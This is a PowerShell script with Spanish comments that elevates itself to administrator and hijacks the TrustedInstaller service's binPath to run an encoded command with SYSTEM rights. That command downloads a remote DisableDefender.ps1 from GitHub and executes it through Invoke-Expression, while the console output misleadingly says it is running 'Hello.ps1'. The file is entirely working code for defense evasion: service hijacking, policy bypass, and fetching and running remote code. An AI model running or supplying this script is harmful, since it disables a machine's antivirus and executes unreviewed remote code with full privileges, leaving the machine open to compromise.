# Verificar si se ejecuta como administrador; si no, relanzar con privilegios elevados
If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
  Start-Process PowerShell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
  Exit
}

# Definir la función Run-Trusted para ejecutar comandos con privilegios de SYSTEM
function Run-Trusted([String]$command) {
  Stop-Service -Name TrustedInstaller -Force -ErrorAction SilentlyContinue
  $service = Get-WmiObject -Class Win32_Service -Filter "Name='TrustedInstaller'"
  $DefaultBinPath = $service.PathName
  $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
  $base64Command = [Convert]::ToBase64String($bytes)
  sc.exe config TrustedInstaller binPath= "cmd.exe /c powershell.exe -encodedcommand $base64Command" | Out-Null
  sc.exe start TrustedInstaller | Out-Null
  sc.exe config TrustedInstaller binpath= "`"$DefaultBinPath`"" | Out-Null
  Stop-Service -Name TrustedInstaller -Force -ErrorAction SilentlyContinue
}

# Comando para descargar y ejecutar Hello.ps1 con bypass de política
$executeCommand = @"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "\$scriptContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/zoicware/DefenderProTools/main/DisableDefender.ps1' -UseBasicParsing; Invoke-Expression \$scriptContent.Content"
"@

# Ejecutar el comando con Run-Trusted
Write-Host 'Downloading and executing Hello.ps1 from GitHub...'
Run-Trusted -command $executeCommand
Write-Host 'Execution completed!'


#usar powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\Mio.ps1
